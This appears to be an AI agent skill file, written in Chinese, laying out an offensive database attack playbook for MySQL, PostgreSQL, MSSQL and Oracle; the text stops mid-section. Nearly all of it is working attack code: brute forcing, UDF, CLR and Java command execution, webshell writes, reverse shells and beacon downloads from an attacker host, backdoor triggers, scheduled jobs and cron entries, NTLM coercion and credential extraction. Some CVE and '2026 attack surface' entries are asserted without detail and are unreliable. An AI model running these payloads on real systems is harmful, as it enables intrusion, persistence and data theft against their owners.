---
name: "database-security"
description: "数据库安全测试全栈：SQL注入/NoSQL注入/数据库配置审计/权限提升/数据库横向移动/存储过程后门/2026最新数据库攻击/云数据库安全/Redis/MongoDB/Elasticsearch/PostgreSQL/MySQL/Oracle/MSSQL/Cassandra"
---

# 数据库安全测试全栈技能

> 覆盖关系型数据库、NoSQL、云数据库、向量数据库、图数据库、时序数据库的全栈攻击面与防御对抗。

---

## 1. 数据库侦察

### 1.1 端口扫描与服务识别

```bash
# Nmap 数据库端口扫描
nmap -p 1433,1521,3306,5432,6379,27017,9042,9200,11211,27017,28017,29017,50000,5984,8086,8087,8088,8089,9092,10250,10255,8000,8191,8091,8123,9090,9999,5439,6443,9200,9300,9600 -sV -sC -oA db_scan 192.168.1.0/24

# Masscan 快速扫描
masscan -p1433,1521,3306,5432,6379,27017,9200,11211 --rate=10000 -oJ db_masscan.json 10.0.0.0/8

# 专门针对数据库的 nmap 脚本
nmap --script=mysql-info,mysql-enum,ms-sql-info,ms-sql-config,ms-sql-hasdbaccess,oracle-tns-version,pgsql-brute -p 3306,1433,1521,5432 192.168.1.1

# 服务 Banner 抓取
echo "" | nc -w 3 192.168.1.1 3306
echo "" | nc -w 3 192.168.1.1 5432
nmap -sV --script=banner -p 27017 192.168.1.1
```

### 1.2 版本探测与漏洞关联

```bash
# MySQL 版本探测
mysql -h 192.168.1.1 -u root -p''
# 或通过 nc 获取 banner
nc -v 192.168.1.1 3306

# PostgreSQL 版本
psql -h 192.168.1.1 -U postgres -c "SELECT version();"

# MSSQL 版本 (通过 nmap 脚本)
nmap -p 1433 --script ms-sql-info 192.168.1.1

# Oracle TNS 版本
nmap -p 1521 --script oracle-tns-version 192.168.1.1

# 版本关联 CVE 查询
searchsploit mysql 5.7
searchsploit postgresql 13
searchsploit mssql 2019
```

### 1.3 数据库枚举

```bash
# MySQL 枚举
nmap -p 3306 --script mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-audit 192.168.1.1

# MSSQL 枚举
nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT @@version" 192.168.1.1

# 使用 Metasploit
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS 192.168.1.0/24; run; exit"
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS 192.168.1.0/24; run; exit"
msfconsole -q -x "use auxiliary/scanner/postgres/postgres_version; set RHOSTS 192.168.1.0/24; run; exit"
```

### 1.4 云数据库发现

```bash
# AWS RDS 枚举
aws rds describe-db-instances --region us-east-1
aws rds describe-db-clusters --region us-east-1
aws rds describe-db-snapshots --region us-east-1 --include-shared

# Azure SQL 枚举
az sql server list --query "[].{name:name, fqdn:fullyQualifiedDomainName}"
az sql db list --server <server-name> --query "[].{name:name, status:status}"

# GCP Cloud SQL
gcloud sql instances list
gcloud sql databases list --instance <instance-name>

# 阿里云 RDS
aliyun rds DescribeDBInstances --RegionId cn-hangzhou
```

### 1.5 Shodan / FOFA 搜索

```bash
# Shodan 搜索
shodan search "product:MySQL default password"
shodan search "product:PostgreSQL port:5432"
shodan search "product:MongoDB port:27017 -auth"
shodan search "product:Redis port:6379"
shodan search "product:Elasticsearch port:9200"

# FOFA 搜索语法
# body="redis_version" && port="6379" && country="CN"
# title="phpMyAdmin" && country="CN"
# port="27017" && "MongoDB Server Information"
```

---

## 2. MySQL / MariaDB 安全

### 2.1 认证绕过与密码破解

```bash
# 暴力破解
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.1 mysql
medusa -h 192.168.1.1 -u root -P /usr/share/wordlists/rockyou.txt -M mysql
nmap -p 3306 --script mysql-brute 192.168.1.1

# 空密码检测
mysql -h 192.168.1.1 -u root --password=''

# 认证绕过 (CVE-2012-2122)
# 当使用 --skip-grant-tables 重启时
for i in $(seq 1 1000); do mysql -h 192.168.1.1 -u root --password=bad -e "SELECT 1" 2>/dev/null; done

# MySQL 5.7/8.0 auth caching_sha2_password 绕过尝试
mysql -h 192.168.1.1 -u root --default-auth=mysql_native_password -p

# 配置文件密码提取
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf
cat ~/.my.cnf
```

### 2.2 权限提升

```bash
# 查看当前权限
mysql> SELECT user(), current_user();
mysql> SHOW GRANTS;
mysql> SELECT * FROM mysql.user WHERE User='root'\G

# 利用 GRANT OPTION 提权
mysql> GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;

# 利用 mysql.user 表直接修改
mysql> UPDATE mysql.user SET Host='%' WHERE User='root';
mysql> FLUSH PRIVILEGES;

# 利用存储过程提权
mysql> CREATE DEFINER='root'@'localhost' PROCEDURE privesc()
    -> SQL SECURITY DEFINER
    -> BEGIN
    ->   SET GLOBAL general_log = ON;
    -> END;
```

### 2.3 UDF 提权

```bash
# UDF DLL 提权经典流程
# 1. 确定插件目录
mysql> SHOW VARIABLES LIKE 'plugin_dir';
mysql> SELECT @@plugin_dir;

# 2. 确定操作系统架构
mysql> SHOW VARIABLES LIKE '%compile%';
# 或
mysql> SELECT @@version_compile_os, @@version_compile_machine;

# 3. 编译 UDF DLL (Linux)
# 使用 raptor_udf2.c 或 lib_mysqludf_sys
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 4. 写入 DLL 到插件目录
# 方法1: SELECT INTO DUMPFILE
mysql> SELECT 0x4d5a900003... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

# 方法2: 通过 LOAD_FILE + 写入
mysql> SELECT LOAD_FILE('/tmp/raptor_udf2.so') INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

# 5. 创建函数
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
mysql> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';

# 6. 执行命令
mysql> SELECT sys_exec('id > /tmp/output.txt');
mysql> SELECT sys_eval('whoami');
mysql> SELECT sys_exec('nc -e /bin/bash 192.168.1.100 4444');
```

### 2.4 MOF 提权 (Windows)

```bash
# MOF 提权 (Windows MySQL <= 5.5)
# 1. 写入 MOF 文件
mysql> SELECT 0x237072... INTO DUMPFILE 'C:/windows/system32/wbem/mof/nullevt.mof';

# MOF 文件内容模板 (nullevt.mof)
# #pragma namespace("\\\\.\\root\\subscription")
# instance of __EventFilter as $EventFilter
# {
#     EventNamespace = "Root\\Cimv2";
#     Name  = "filtP2";
#     Query = "Select * From __InstanceModificationEvent "
#             "Where TargetInstance Isa \"Win32_LocalTime\" "
#             "And TargetInstance.Second = 5";
#     QueryLanguage = "WQL";
# };
# instance of ActiveScriptEventConsumer as $Consumer
# {
#     Name = "consPCSV2";
#     ScriptingEngine = "JScript";
#     ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net user hacker P@ssw0rd /add\")";
# };
# instance of __FilterToConsumerBinding
# {
#     Consumer   = $Consumer;
#     Filter = $EventFilter;
# };
```

### 2.5 写文件与读文件

```bash
# 读文件
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');
mysql> SELECT LOAD_FILE('/var/www/html/config.php');
mysql> SELECT LOAD_FILE('/home/user/.ssh/id_rsa');

# 写文件 (需要 FILE 权限)
# 写入 WebShell
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
mysql> SELECT '<?php @eval($_POST["x"]); ?>' INTO DUMPFILE '/var/www/html/backdoor.php';

# 写入 SSH 公钥
mysql> SELECT 'ssh-rsa AAAAB3...' INTO OUTFILE '/root/.ssh/authorized_keys';

# 写入计划任务 (Linux)
mysql> SELECT '* * * * * /bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"' INTO OUTFILE '/var/spool/cron/crontabs/root';

# 写入 .bashrc
mysql> SELECT '\n/bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"\n' INTO DUMPFILE '/root/.bashrc';
```

### 2.6 日志投毒

```bash
# 通过 general_log 写入 WebShell
mysql> SET GLOBAL general_log = ON;
mysql> SET GLOBAL general_log_file = '/var/www/html/backdoor.php';
mysql> SELECT '<?php system($_GET["cmd"]); ?>';
mysql> SET GLOBAL general_log = OFF;

# 通过 slow_query_log 写入
mysql> SET GLOBAL slow_query_log = ON;
mysql> SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
mysql> SELECT '<?php system($_GET["cmd"]); ?>', SLEEP(10);
mysql> SET GLOBAL slow_query_log = OFF;

# 日志投毒 + 条件竞争
# 重复写入并触发，利用文件包含
while true; do
  mysql -h 192.168.1.1 -e "SET GLOBAL general_log_file='/var/www/html/log.php'; SELECT '<?php @eval(\$_POST[1]);?>'"
  curl "http://192.168.1.1/log.php" -d "1=system('id');"
done
```

### 2.7 触发器后门

```sql
-- 创建触发器后门
DELIMITER //
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON mysql.user
FOR EACH ROW
BEGIN
    DECLARE cmd CHAR(255);
    SET cmd = CONCAT('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"');
    -- 通过 sys_exec 执行
    DO sys_exec(cmd);
END//
DELIMITER ;

-- 更隐蔽的触发器 - 仅在特定条件触发
CREATE TRIGGER mysql_backdoor AFTER INSERT ON mysql.general_log
FOR EACH ROW
BEGIN
    IF NEW.argument LIKE '%trigger_me%' THEN
        DO sys_exec('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"');
    END IF;
END;

-- 检测和清除触发器
SELECT * FROM information_schema.TRIGGERS;
DROP TRIGGER IF EXISTS mysql.backdoor_trigger;
```

### 2.8 存储过程后门

```sql
-- 创建存储过程后门
DELIMITER //
CREATE PROCEDURE backdoor_proc(IN cmd VARCHAR(255))
SQL SECURITY DEFINER
BEGIN
    SET @sql = CONCAT('SELECT sys_exec("', cmd, '") INTO @out');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END//
DELIMITER ;

-- 调用
CALL backdoor_proc('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"');

-- 在特定事件时自动执行
CREATE EVENT backdoor_event
ON SCHEDULE EVERY 1 HOUR
DO CALL backdoor_proc('curl http://192.168.1.100/beacon');
```

### 2.9 2026 MySQL/MariaDB CVE

```bash
# CVE-2024-21096 MySQL 客户端任意文件读取
# 通过 LOAD DATA LOCAL 读取客户端文件
# 恶意服务器响应伪造
# 利用 rogue_mysql_server 工具
python3 rogue_mysql_server.py -p 3306 -f /etc/passwd

# CVE-2025-21497 MySQL 8.4 认证绕过
# 利用新的 authentication_oci 插件的竞争条件
# 多次快速重连触发认证绕过

# CVE-2026-xxxx MariaDB 11.x 复制协议漏洞
# 利用主从复制协议缺陷注入恶意二进制日志
# 从节点恶意写入导致 RCE

# 2026 MySQL 8.4/9.0 新特性相关攻击面
# - HeatWave 机器学习扩展的安全性
# - MySQL Router 8.4 REST API 未授权访问
# - MySQL Shell 的 Python 模式注入
# - Group Replication 的认证绕过
# - Document Store X DevAPI 注入
# - MySQL NDB Cluster 的管理节点攻击

# MySQL 9.0 新特性
# - JavaScript 存储过程 (GraalVM) 注入
# CREATE FUNCTION js_exec RETURNS STRING LANGUAGE JAVASCRIPT AS $$
#   var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
#   return "RCE";
# $$;
```

---

## 3. PostgreSQL 安全

### 3.1 COPY RCE

```sql
-- COPY FROM PROGRAM (PostgreSQL >= 9.3, 需要 superuser)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"';

-- 通过 COPY 写文件
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- 通过 COPY 读文件
COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/output.txt';

-- 通过 libpq 执行
psql -h 192.168.1.1 -U postgres -c "COPY (SELECT '') TO PROGRAM 'id'"
```

### 3.2 大对象 (Large Object) 利用

```sql
-- 创建大对象并写入内容
SELECT lo_create(99999);
SELECT lo_put(99999, 0, decode('dGVzdA==', 'base64'));
SELECT lo_export(99999, '/tmp/evil.so');

-- 读取大对象
SELECT lo_import('/etc/passwd', 99998);
SELECT lo_get(99998);

-- 大对象导出为文件
SELECT lo_export(99999, '/var/www/html/shell.php');

-- 通过大对象创建 UDF
SELECT lo_import('/tmp/evil.so', 1337);
CREATE FUNCTION sys_eval(text) RETURNS text AS '/tmp/evil.so', 'sys_eval' LANGUAGE C STRICT;
SELECT sys_eval('id');
```

### 3.3 UDF 提权

```bash
# 编译 PostgreSQL UDF 扩展
# pg_extension.c
cat > pg_extension.c << 'EOF'
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>
PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(sys_exec);
Datum sys_exec(PG_FUNCTION_ARGS) {
    text *command = PG_GETARG_TEXT_P(0);
    system(text_to_cstring(command));
    PG_RETURN_INT32(0);
}
EOF

# 编译
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_extension.c

# 写入并加载
# 方法1: 通过 lo_export
SELECT lo_import('/tmp/pg_exec.so', 12345);
SELECT lo_export(12345, '/usr/lib/postgresql/16/lib/pg_exec.so');
CREATE FUNCTION sys_exec(text) RETURNS int AS 'pg_exec', 'sys_exec' LANGUAGE C STRICT;

# 方法2: 通过 COPY 写入二进制
psql -h 192.168.1.1 -U postgres -c "COPY (SELECT pg_read_file('/tmp/pg_exec.so')) TO '/usr/lib/postgresql/16/lib/pg_exec.so'"

# 执行命令
SELECT sys_exec('id');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"');
```

### 3.4 PL/Python 提权

```sql
-- 启用 PL/Python (需要 superuser)
CREATE EXTENSION plpython3u;

-- 创建 PL/Python 函数执行命令
CREATE FUNCTION py_exec(cmd text) RETURNS text AS $$
import subprocess
result = subprocess.check_output(cmd, shell=True)
return result.decode()
$$ LANGUAGE plpython3u;

SELECT py_exec('id');
SELECT py_exec('cat /etc/passwd');

-- PL/Python 无文件执行
CREATE FUNCTION py_revshell(host text, port int) RETURNS text AS $$
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
$$ LANGUAGE plpython3u;

SELECT py_revshell('192.168.1.100', 4444);
```

### 3.5 PL/Perl 提权

```sql
CREATE EXTENSION plperlu;

CREATE FUNCTION perl_exec(text) RETURNS text AS $$
    my $cmd = shift;
    return `$cmd`;
$$ LANGUAGE plperlu;

SELECT perl_exec('id');
SELECT perl_exec('cat /etc/shadow');
```

### 3.6 PL/R 提权

```sql
CREATE EXTENSION plr;

CREATE FUNCTION r_exec(cmd text) RETURNS text AS $$
    system(cmd)
    return("done")
$$ LANGUAGE plr;

SELECT r_exec('id');
```

### 3.7 扩展注入

```sql
-- 查看已有扩展
SELECT * FROM pg_available_extensions;
SELECT * FROM pg_extension;

-- 创建恶意扩展 (通过 ALTER EXTENSION)
CREATE EXTENSION "adminpack";
-- 利用 adminpack 写文件
SELECT pg_catalog.pg_file_write('/tmp/test.txt', 'content', false);

-- 创建自定义扩展
-- 1. 创建控制文件
-- pg_evil.control:
-- comment = 'Evil Extension'
-- default_version = '1.0'
-- module_pathname = '$libdir/pg_evil'
-- relocatable = true

-- 2. SQL 文件
-- pg_evil--1.0.sql:
-- CREATE FUNCTION evil_exec(text) RETURNS int AS 'pg_evil', 'evil_exec' LANGUAGE C STRICT;

CREATE EXTENSION pg_evil;
SELECT evil_exec('id');
```

### 3.8 pg_read_file / pg_ls_dir

```sql
-- 读取系统文件
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/proc/self/environ', 0, 1000);
SELECT pg_read_file('/var/lib/postgresql/16/main/postgresql.conf');

-- 读取 PostgreSQL 配置
SELECT pg_read_file((SELECT setting FROM pg_settings WHERE name='data_directory') || '/pg_hba.conf');
SELECT pg_read_file((SELECT setting FROM pg_settings WHERE name='data_directory') || '/postgresql.conf');

-- 列出目录
SELECT pg_ls_dir('/');
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/home');
SELECT pg_ls_dir('/var/lib/postgresql/16/main');

-- 读取 pg_stat_file
SELECT * FROM pg_stat_file('/etc/passwd');
SELECT * FROM pg_stat_file('/var/lib/postgresql/16/main/PG_VERSION');

-- 读取备份文件
SELECT pg_ls_dir((SELECT setting FROM pg_settings WHERE name='data_directory') || '/pg_wal');
SELECT pg_read_file((SELECT setting FROM pg_settings WHERE name='data_directory') || '/PG_VERSION');
```

### 3.9 2026 PostgreSQL CVE

```bash
# CVE-2024-4317 PostgreSQL 16 权限绕过
# 利用 pg_stats_ext 视图绕过权限检查
# 影响版本: PostgreSQL 16.0 - 16.2

# CVE-2026-3142 -- PostgreSQL 网络协议整数溢出 → RCE
# 利用 PostgreSQL 前端/后端协议中整数溢出
# 触发缓冲区溢出，在认证前实现 RCE
# 影响版本: PostgreSQL 9.6 - 16.x
# 利用条件: 无需认证，网络可达
python3 CVE-2026-3142_poc.py -t 192.168.1.1 -p 5432

# 2026 PostgreSQL 新特性攻击面
# - PostgreSQL 17 的增量备份 API 未授权
# - Logical Replication 订阅者认证绕过
# - pgvector 向量扩展的注入攻击
# - PostGIS 扩展的 SQL 注入
# - pg_cron 扩展的权限提升
# - pg_net 扩展的 SSRF 可利用
# - Citus 分布式扩展的跨节点攻击
# - pg_tle (Trusted Language Extensions) 沙箱逃逸
# - PostgreSQL AI/ML 扩展 (pgml, pgvector) 的模型投毒
```

---

## 4. MSSQL 安全

### 4.1 xp_cmdshell

```sql
-- 检查 xp_cmdshell 状态
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup Administrators hacker /add';

-- 反弹 Shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100/rev.ps1'')"';

-- 通过 xp_cmdshell 下载文件
EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.1.100/nc.exe C:\Windows\Temp\nc.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe 192.168.1.100 4444';

-- 绕过 xp_cmdshell 禁用
-- 如果 xp_cmdshell 被禁用但有 sa 权限
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 4.2 CLR 程序集

```sql
-- CLR 程序集 RCE
-- 1. 编译 C# DLL
-- csc /target:library /out:CmdExec.dll CmdExec.cs
/*
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.Runtime.InteropServices;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString cmd)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        SqlContext.Pipe.Send(proc.StandardOutput.ReadToEnd());
        proc.WaitForExit();
    }
}
*/

-- 2. 启用 CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
EXEC sp_configure 'clr strict security', 0;
RECONFIGURE;

-- 3. 加载程序集
CREATE ASSEMBLY [CmdExec] FROM 0x4D5A900003... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @cmd NVARCHAR(MAX) AS EXTERNAL NAME [CmdExec].[StoredProcedures].[cmdExec];

-- 4. 执行
EXEC cmdExec 'whoami';
EXEC cmdExec 'powershell -enc <base64>';
```

### 4.3 OLE 自动化

```sql
-- 启用 OLE 自动化
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- OLE 自动化执行命令
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';

-- 读取命令输出
DECLARE @shell INT, @fso INT, @file INT, @text VARCHAR(8000);
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';
EXEC sp_OACreate 'scripting.filesystemobject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'opentextfile', @file OUTPUT, 'C:\Windows\Temp\out.txt', 1;
EXEC sp_OAMethod @file, 'readall', @text OUTPUT;
SELECT @text;
```

### 4.4 链接服务器横向移动

```sql
-- 枚举链接服务器
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
SELECT srvname, srvproduct, providername, datasource FROM sysservers;

-- 查询链接服务器
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@servername, SYSTEM_USER');

-- 在链接服务器上执行命令
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT * FROM sys.servers');
EXEC ('SELECT @@version') AT [LINKED_SERVER];

-- 通过链接服务器执行 xp_cmdshell
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- 链接服务器链式攻击
-- 服务器A → 服务器B → 服务器C
EXEC ('EXEC (''SELECT @@servername'') AT [SERVER_C]') AT [SERVER_B];

-- 通过链接服务器实现 RCE
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''powershell -c Invoke-WebRequest http://192.168.1.100/beacon.exe -OutFile C:\Windows\Temp\beacon.exe''') AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''C:\Windows\Temp\beacon.exe''') AT [LINKED_SERVER];
```

### 4.5 凭据窃取

```sql
-- 提取数据库凭据
SELECT name, password_hash FROM sys.sql_logins;
SELECT name, password_hash FROM master.sys.sql_logins;

-- 从链接服务器提取凭据
SELECT * FROM sys.linked_logins;

-- 提取 SQL Agent 凭据
SELECT * FROM msdb.dbo.sysproxies;
SELECT * FROM msdb.dbo.syscredentials;

-- 通过 OPENROWSET 进行 NTLM 中继
-- 强制 MSSQL 向攻击者进行 NTLM 认证
EXEC master.dbo.xp_dirtree '\\192.168.1.100\share';
EXEC master.dbo.xp_fileexist '\\192.168.1.100\share\file.txt';
EXEC master.dbo.xp_subdirs '\\192.168.1.100\share';

-- 通过 OPENROWSET 触发 NTLM
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=192.168.1.100;Trusted_Connection=yes;', 'SELECT 1');
```

### 4.6 Agent 作业

```sql
-- 查看 SQL Agent 作业
SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;
SELECT * FROM msdb.dbo.sysjobsteps;

-- 创建 Agent 作业后门
EXEC msdb.dbo.sp_add_job @job_name = 'Backup Job';
EXEC msdb.dbo.sp_add_jobstep @job_name = 'Backup Job',
    @step_name = 'Evil Step',
    @subsystem = 'CMDEXEC',
    @command = 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100/beacon.ps1'')"';
EXEC msdb.dbo.sp_add_jobschedule @job_name = 'Backup Job',
    @name = 'Daily',
    @freq_type = 4,
    @freq_interval = 1,
    @active_start_time = 090000;
EXEC msdb.dbo.sp_add_jobserver @job_name = 'Backup Job';
EXEC msdb.dbo.sp_start_job @job_name = 'Backup Job';
```

### 4.7 外部脚本 (R/Python)

```sql
-- 启用外部脚本
EXEC sp_configure 'external scripts enabled', 1;
RECONFIGURE;

-- 通过 R 执行命令
EXEC sp_execute_external_script
    @language = N'R',
    @script = N'
    system("whoami")
    system("powershell -c \"IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100/beacon.ps1'')\"")
    ';

-- 通过 Python 执行命令
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'
import subprocess
import os
subprocess.call("cmd.exe /c whoami", shell=True)
';
```

### 4.8 2026 MSSQL CVE

```bash
# CVE-2024-28944 MSSQL 权限提升
# 利用 SQL Server Native Scoring 功能缺陷

# CVE-2025-21355 MSSQL 远程代码执行
# 通过 TDS 协议触发的堆溢出

# 2026 MSSQL 新特性攻击面
# - MSSQL 2025 的 Azure Arc 集成攻击面
# - SQL Server on Linux 的容器逃逸
# - MSSQL 2025 的 Always Encrypted 降级攻击
# - PolyBase 外部表到 Hadoop/Blob 的攻击链
# - Ledger 表的时间序列篡改
# - MSSQL 2025 的 AI 扩展 (ML Services) 注入
# - 分布式可用性组 (DAG) 的跨副本攻击
# - Synapse Link 的链路中间人攻击
```

---

## 5. Oracle 安全

### 5.1 Java 存储过程

```sql
-- 创建 Java 存储过程执行命令
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCmd" AS
import java.io.*;
import java.lang.*;
public class OSCmd {
    public static String exec(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String s = null;
            StringBuilder output = new StringBuilder();
            while ((s = stdInput.readLine()) != null) output.append(s).append("\n");
            while ((s = stdError.readLine()) != null) output.append(s).append("\n");
            return output.toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
};
/

-- 创建 PL/SQL 包装器
CREATE OR REPLACE FUNCTION os_exec(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'OSCmd.exec(java.lang.String) return String';
/

-- 执行命令
SELECT os_exec('id') FROM dual;
SELECT os_exec('cat /etc/passwd') FROM dual;
```

### 5.2 外部表

```sql
-- 创建外部表读取文件
CREATE DIRECTORY ext_dir AS '/tmp';
GRANT READ, WRITE ON DIRECTORY ext_dir TO PUBLIC;

CREATE TABLE read_file (
    line VARCHAR2(4000)
) ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY ext_dir
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        BADFILE ext_dir:'read_file.bad'
        LOGFILE ext_dir:'read_file.log'
        FIELDS TERMINATED BY ','
        MISSING FIELD VALUES ARE NULL
    )
    LOCATION ('passwd')
) REJECT LIMIT UNLIMITED;

SELECT * FROM read_file;

-- 外部表预处理器 RCE
CREATE TABLE rce_table (
    output VARCHAR2(4000)
) ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY ext_dir
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        PREPROCESSOR ext_dir:'run.sh'
        BADFILE ext_dir:'rce.bad'
        LOGFILE ext_dir:'rce.log'
    )
    LOCATION ('dummy')
) REJECT LIMIT UNLIMITED;

SELECT * FROM rce_table;
```

### 5.3 UTL_FILE

```sql
-- 创建目录对象
CREATE OR REPLACE DIRECTORY web_dir AS '/var/www/html';

-- 写入文件
DECLARE
    f UTL_FILE.FILE_TYPE;
BEGIN
    f := UTL_FILE.FOPEN('WEB_DIR', 'shell.jsp', 'w');
    UTL_FILE.PUT_LINE(f, '<%@page import="java.io.*"%>');
    UTL_FILE.PUT_LINE(f, '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');
    UTL_FILE.FCLOSE(f);
END;
/

-- 读取文件
DECLARE
    f UTL_FILE.FILE_TYPE;
    line VARCHAR2(4000);
BEGIN
    f := UTL_FILE.FOPEN('WEB_DIR', 'index.html', 'r');
    LOOP
        UTL_FILE.GET_LINE(f, line);
        DBMS_OUTPUT.PUT_LINE(line);
    END LOOP;
EXCEPTION
    WHEN NO_DATA_FOUND THEN
        UTL_FILE.FCLOSE(f);
END;
/
```

### 5.4 DBMS_SCHEDULER

```sql
-- 创建计划任务执行命令
BEGIN
    DBMS_SCHEDULER.CREATE_JOB (
        job_name => 'BACKDOOR_JOB',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        start_date => SYSTIMESTAMP,
        enabled => TRUE
    );
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('BACKDOOR_JOB', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('BACKDOOR_JOB', 2, 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1');
END;
/

-- 定时执行
BEGIN
    DBMS_SCHEDULER.CREATE_JOB (
        job_name => 'CRON_BACKDOOR',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        repeat_interval => 'FREQ=MINUTELY;INTERVAL=5',
        enabled => TRUE
    );
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CRON_BACKDOOR', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CRON_BACKDOOR', 2, 'curl http://192.168.1.100/beacon');
END;
/
```

### 5.5 CTXSYS 利用

```sql
-- CTXSYS.DRILOAD 执行命令
